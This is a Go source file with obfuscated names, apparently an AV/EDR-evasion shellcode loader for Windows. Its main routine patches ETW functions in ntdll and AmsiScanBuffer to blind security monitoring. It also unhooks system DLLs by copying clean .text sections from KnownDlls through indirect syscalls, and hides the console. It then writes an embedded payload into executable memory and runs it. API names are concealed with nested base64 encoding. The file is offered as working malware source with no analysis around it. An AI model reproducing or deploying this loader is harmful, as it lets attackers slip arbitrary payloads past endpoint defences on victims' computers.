
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"McRLcVEsDBfv/McRLcVEsDBfv"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		WpiGCbc= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		sfMbpW uint16
		GNhumrme uint16
		wJZNc int = 4
	)

	
	
	
	
	func UVCcH() string {
		Aynnl, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		YPUxBlH, _, _ :=  Aynnl.GetStringValue("CurrentVersion")
		kLocD, _, err := Aynnl.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//TywD, _, _ := Aynnl.GetIntegerValue("CurrentMinorVersionNumber")
			YPUxBlH = strconv.FormatUint(kLocD, 10)
		}
		defer Aynnl.Close()
		if YPUxBlH == "10" {
			sfMbpW = 0x18
			GNhumrme = 0x50
		} else if YPUxBlH == "6.3" {
			sfMbpW = 0x17
			GNhumrme = 0x4f
		} else if YPUxBlH == "6.2" {
			sfMbpW = 0x16
			GNhumrme = 0x4e
		} else if YPUxBlH == "6.1" {
			sfMbpW = 0x15
			GNhumrme= 0x4d
		}
		return YPUxBlH 

	}

	func JRDbj(eUQERkGr string,) string {
		var tEwuLSa []byte
			tEwuLSa, _ = base64.StdEncoding.DecodeString(eUQERkGr)
		WuYBFHTN := 1
		for i := 1; i < wJZNc; i++ {
			tEwuLSa, _ = base64.StdEncoding.DecodeString(string(tEwuLSa))
			WuYBFHTN += i
		}
		return string(tEwuLSa)
	
	}

	

	func tMwTGuCdmJL(show bool) {
		zqWwNGRWXomufqDFj := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(JRDbj("VldwS1YwMUdSWGxQV0ZacVRXcHNlbGRzV210alIwcDBWVzVhYTJSNk1Eaz0="))
		eXbedwXYjb := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(JRDbj("VmxSS2IyUnRVWGhhU0VKcFlsWktNbHBJWXpsUVVUMDk="))
		MJNfCLnJqrdxEZjYMU, _, _ := zqWwNGRWXomufqDFj.Call()
		if MJNfCLnJqrdxEZjYMU == 0 {
			return
		}
		if show {
		var QkSfbapFuHcvDOuhe uintptr = 9
		eXbedwXYjb.Call(MJNfCLnJqrdxEZjYMU, QkSfbapFuHcvDOuhe)
		} else {
		var ukNPkfQOLY uintptr = 0
		eXbedwXYjb.Call(MJNfCLnJqrdxEZjYMU, ukNPkfQOLY)
		}
	}



	
	const (
		kDMX= 997
	)
	var VcqMDc error = syscall.Errno(kDMX)
	var iCtLBSnY = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(JRDbj("Vm1wT1MyTkhVa2hXYkVacVlsUnNjVmRzYUU5bGJGSllWbTVTYVUwd2J6RT0="))


	func JgVAjtES(yulM uintptr, GEmfcEK uintptr, lLzHvFg *byte, ILrFiq uintptr, qRsx *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(iCtLBSnY.Addr(), 5, uintptr(yulM), uintptr(GEmfcEK), uintptr(unsafe.Pointer(lLzHvFg)), uintptr(ILrFiq), uintptr(unsafe.Pointer(qRsx)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = VYUj(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func VYUj(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case kDMX:
			return VcqMDc
		}
	
		return e
	}
	

	
	var ZEmyIC = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(JRDbj("Vld4b1UwMHhVblJQVkVKb1ZqRndkMWRVU2tkTlIwWllUMWhXVm1KV1duVlpWbWhQVFVad1dWTlVNRDA9"))
	var ieqGE = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(JRDbj("Vld4b1UwMHhTbGxYYlhocFlteEtWRmRzWkd0alIwMTZWVzE0YWxwNk1Eaz0="))
	var fHnN = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(JRDbj("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQldWMnBHYVZJell6az0="))
	var LKzjEsJt = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(JRDbj("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQlNVRlF3UFE9PQ=="))

	func IMUx() {
		jNURKbE := uintptr(0xffffffffffffffff)
		LgKlWc := []uintptr{ ZEmyIC.Addr(), ieqGE.Addr(), fHnN.Addr(), LKzjEsJt.Addr()}
		for i, _ := range LgKlWc {
			TbGXmRod, _ := hex.DecodeString("4833C0C3")
			var SNHmIDK uintptr
			zanh := len(TbGXmRod)
			JgVAjtES(jNURKbE, LgKlWc[i], &TbGXmRod[0], uintptr(uint32(zanh)), &SNHmIDK)
		}
	}

	func MZBPr(jNURKbE windows.Handle) {
		LgKlWc := []uintptr{ ZEmyIC.Addr(), ieqGE.Addr(), fHnN.Addr(), LKzjEsJt.Addr()}
		for i, _ := range LgKlWc {
			TbGXmRod, _ := hex.DecodeString("4833C0C3")
			var SNHmIDK uintptr
			zanh := len(TbGXmRod)
			JgVAjtES(uintptr(jNURKbE), LgKlWc[i], &TbGXmRod[0], uintptr(uint32(zanh)), &SNHmIDK)
		}
	}



	
	func iLnSji() {
		var YdXSGzHs uint64
		YdXSGzHs = 0xffffffffffffffff
		RvAui, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		OWXIcu, _ := windows.GetProcAddress(RvAui, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		kEpAfWa, _ :=  hex.DecodeString("B857000780C3")
		var tjiFIsKW uintptr
		vwgLm := len(kEpAfWa)
		JgVAjtES(uintptr(YdXSGzHs), uintptr(uint(OWXIcu)), &kEpAfWa[0], uintptr(uint32(vwgLm)), &tjiFIsKW)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func zhktsAE() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		IMUx()
		iLnSji()
		time.Sleep(2739 * time.Millisecond)
		YPUxBlH := UVCcH()
		
		if YPUxBlH == "10" {
			JkWbgTjObOmAcYfJE()
		}
		IMUx()
		tMwTGuCdmJL(false)
		XPVsnCZhLpIqHjDPK := McRLcVEsDBfv.MJPypugYrvPqbM()
		GtbhkLJWPpb(XPVsnCZhLpIqHjDPK)
	}

	
	func GtbhkLJWPpb(XPVsnCZhLpIqHjDPK []byte){
		IWoisGbQSz := windows.NewLazySystemDLL("ntdll.dll")
		xxSMmMZmCl := windows.NewLazySystemDLL("kernel32")
		QIPGiBugGlwS := IWoisGbQSz.NewProc("RtlCopyMemory")
		jCAtUlSLvpmTbaN := xxSMmMZmCl.NewProc("VirtualAlloc")

		var hLFNRCvkvXosgtHp, OwHtMwvwWtUxvdEb uintptr
		var UOkEFMdwZqeYzygDVo uintptr
		AqkXcrCaxSndXZi := uintptr(0xffffffffffffffff)
		owcBwkOcbLFMc := uintptr(len(XPVsnCZhLpIqHjDPK))
		OwHtMwvwWtUxvdEb = 0x40
		hLFNRCvkvXosgtHp = 0x3000
		bQWtIjBklzxl, _, _ := jCAtUlSLvpmTbaN.Call(0, uintptr(len(XPVsnCZhLpIqHjDPK)), hLFNRCvkvXosgtHp, OwHtMwvwWtUxvdEb)

		
		QIPGiBugGlwS.Call(bQWtIjBklzxl, (uintptr)(unsafe.Pointer(&XPVsnCZhLpIqHjDPK[0])), uintptr(len(XPVsnCZhLpIqHjDPK)))
		
		


		McRLcVEsDBfv.NZGminkFBdesbL(
			GNhumrme, 
			AqkXcrCaxSndXZi,
			(*uintptr)(unsafe.Pointer(&bQWtIjBklzxl)),
			&owcBwkOcbLFMc,
			0x20,
			&UOkEFMdwZqeYzygDVo,
			)
		
		syscall.Syscall(bQWtIjBklzxl, 0, 0, 0, 0)
	}


	
	
		var rnUrObLtoiH      uint16
		var uTrLbBXiymuOkzY uint16
		var ERCiyohbwUzelv      uint16
		func JkWbgTjObOmAcYfJE()  {
			YUtjUXqyCzwnShhU := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range YUtjUXqyCzwnShhU {
			KnownDLL(YUtjUXqyCzwnShhU[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(CqxJXVDSVpezMUXZmt  string) []byte {
			
			var xVilyloazOTMY , lLILpqFMfGdRuUAA , tSVJAgGrDYYkKxw  uintptr
			rOCCoxvumhWMVxPt := uintptr(0xffffffffffffffff)
			sOvrOqmHljB := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + CqxJXVDSVpezMUXZmt 
			LRlRcLNuAmlIV, _ := windows.NewNTUnicodeString(sOvrOqmHljB)
			JzZoQMjWwLJUD := windows.OBJECT_ATTRIBUTES{}
			JzZoQMjWwLJUD.Attributes = 0x00000040
			JzZoQMjWwLJUD.ObjectName = LRlRcLNuAmlIV
			JzZoQMjWwLJUD.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			yQwOUFwtJwXznKaTkl := zhktsAE()
			rnUrObLtoiH = 0x37
			DhSSEDniPuc := 0x0004
			r, _ := McRLcVEsDBfv.UcbYmhlHVTkSKGHzzn(
				rnUrObLtoiH, 
				yQwOUFwtJwXznKaTkl, 
				uintptr(unsafe.Pointer(&xVilyloazOTMY)), 
				uintptr(DhSSEDniPuc), 
				uintptr(unsafe.Pointer(&JzZoQMjWwLJUD)),
			)
			if r != 0 {
			}
			uTrLbBXiymuOkzY = 0x28
			zero := 0
			one := 1
			McRLcVEsDBfv.MYQWMlxIBVoKPcx(
				uTrLbBXiymuOkzY, 
				yQwOUFwtJwXznKaTkl, 
				xVilyloazOTMY, 
				rOCCoxvumhWMVxPt, 
				uintptr(unsafe.Pointer(&tSVJAgGrDYYkKxw)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&lLILpqFMfGdRuUAA)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			JVzWaDUjvfTxujV := rawreader.New(tSVJAgGrDYYkKxw, int(lLILpqFMfGdRuUAA))
			sVLOtAHQNjzhVeqq, _ := pe.NewFileFromMemory(JVzWaDUjvfTxujV)
			ZLoEEeezCwicxVDtPZ, err := sVLOtAHQNjzhVeqq.Bytes()
			if err != nil {
			}
			TpNhZBLAtwtT := sVLOtAHQNjzhVeqq.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			sAUYHeUZQcrx := ZLoEEeezCwicxVDtPZ[TpNhZBLAtwtT.Offset:TpNhZBLAtwtT.Size]
			zbQMTGOxogBQllAV, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  CqxJXVDSVpezMUXZmt )
			if error != nil {
			}
			IeNjzKUhsXXZoVSt := zbQMTGOxogBQllAV.Section(".text")
			MzlrVIwWyLAt, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  CqxJXVDSVpezMUXZmt )
			if error != nil {
			}
			ftRkvfFpZacMxcOTuS := MzlrVIwWyLAt.Handle
			TVIfpvLsgufpOf  := uintptr(ftRkvfFpZacMxcOTuS)
			laKJoFqRyh := uint(TVIfpvLsgufpOf) + uint(IeNjzKUhsXXZoVSt.VirtualAddress)
			ERCiyohbwUzelv = 0x50
			RdZpPeBkjRsBFIW := uintptr(len(sAUYHeUZQcrx))
			var EWITKEMfFpud uintptr

			bkedWmQzBRAmMJXGF, _ := McRLcVEsDBfv.TtqrrWcRFbA(
				ERCiyohbwUzelv, 
				yQwOUFwtJwXznKaTkl, 
				rOCCoxvumhWMVxPt, 
				(*uintptr)(unsafe.Pointer(&laKJoFqRyh)), 
				&RdZpPeBkjRsBFIW, 
				0x40, 
				&EWITKEMfFpud,
			)
			if bkedWmQzBRAmMJXGF != 0 {
			}
			XsJsgIlYsZVFIlUdQB(sAUYHeUZQcrx, uintptr(laKJoFqRyh))
			zbQMTGOxogBQllAV.Close()
			bkedWmQzBRAmMJXGF, _ = McRLcVEsDBfv.TtqrrWcRFbA(
				ERCiyohbwUzelv, 
				yQwOUFwtJwXznKaTkl, 
				rOCCoxvumhWMVxPt, 
				(*uintptr)(unsafe.Pointer(&laKJoFqRyh)), 
				&RdZpPeBkjRsBFIW, 
				0x20, 
				&EWITKEMfFpud,
			)
			if bkedWmQzBRAmMJXGF != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(rOCCoxvumhWMVxPt), tSVJAgGrDYYkKxw, 0)
			return sAUYHeUZQcrx
		}


		func XsJsgIlYsZVFIlUdQB(odbbaiguHDPQfpAg []byte, cLWgkvupByf uintptr) {
			for LFcGdjEzxrPTYmnBo := uint32(0); LFcGdjEzxrPTYmnBo < uint32(len(odbbaiguHDPQfpAg)); LFcGdjEzxrPTYmnBo++ {
				TtTfrIMrOtlf := unsafe.Pointer(cLWgkvupByf + uintptr(LFcGdjEzxrPTYmnBo))
				hejxJszXZCITIs := (*byte)(TtTfrIMrOtlf)
				*hejxJszXZCITIs = odbbaiguHDPQfpAg[LFcGdjEzxrPTYmnBo]
			}
		}

	
